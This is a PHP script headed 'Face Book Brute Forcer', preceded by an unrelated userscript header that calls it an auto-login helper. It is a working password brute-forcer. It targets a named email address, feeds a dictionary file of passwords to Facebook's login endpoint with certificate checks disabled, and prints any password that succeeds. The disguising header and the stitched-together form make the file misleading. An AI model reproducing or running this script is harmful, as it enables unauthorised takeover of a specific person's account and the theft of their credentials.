// ==UserScript==
// @name           Facebook bt
// @description    Automatically logins in to Facebook when Username/Password is given.
// @namespace      http://userscripts.org/users/71106
// @include        http://*.facebook.com/
// @copyright      Tristian Flanagan
// ==/UserScript==


<? 
################################ 
# Face Book Brute Forcer 
################################ 
set_time_limit(500); 
$username ="septo.agung.laksono@rocketmail.com"; // username to brute force 
$dictionary ="dictionary.txt"; // need dictionary to password list 
 
function kontrol($kullaniciadi,$sifre){ 
$useragent = "Firefox/3.0.17"; 
$data = "email=$kullaniciadi&pass=$sifre&login=Login" ; 
$ch = curl_init('https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php'); 
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
curl_setopt($ch, CURLOPT_USERAGENT, $useragent); 
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); 
$source=curl_exec ($ch); 
curl_close ($ch); 
if(eregi("Home</title>",$source)){return true;} else {return false;} 
 
} 
 
if(!is_file($dictionary)){echo "$dictionary is not file";exit;} 
$lines=file($dictionary); 
echo "Attack Starting..<br>"; 
sleep(10); 
echo "Attack Started, brute forcing..<br>"; 
foreach($lines as $line){ 
$line=str_replace("\r","",$line); 
$line=str_replace("\n","",$line); 
if(kontrol($username,$line)){echo "<font face=tahoma color=green>[+]</font><font face=tahoma> username:$username , password:$line - P 
assword found : $line</font><br>";$fp=fopen('cookie.txt','w');fwrite($fp,'');exit;} 
else{echo "<font face=tahoma color=brown>[-]</font><font face=tahoma> username:$username , password:$line - Password not found :  
$line</font><br>";} 
} 
?>
